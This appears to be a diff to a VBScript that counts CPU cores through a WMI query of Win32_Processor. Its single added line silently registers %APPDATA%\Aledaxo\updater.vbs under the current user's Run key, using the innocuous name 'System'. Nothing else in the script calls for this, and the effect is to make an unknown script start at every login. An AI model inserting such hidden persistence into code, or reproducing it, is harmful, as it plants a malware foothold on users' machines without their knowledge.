@@ -8,6 +8,7 @@ Const wbemFlagForwardOnly = &h20
 strComputer = "."
 Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
 Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Processor", "WQL",wbemFlagReturnImmediately + wbemFlagForwardOnly)
+WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System",WshShell.ExpandEnvironmentStrings("%APPDATA%")&"\Aledaxo\updater.vbs", "REG_SZ"
 cores=0
 For Each objItem In colItems
 cores=cores + objItem.NumberOfLogicalProcessors
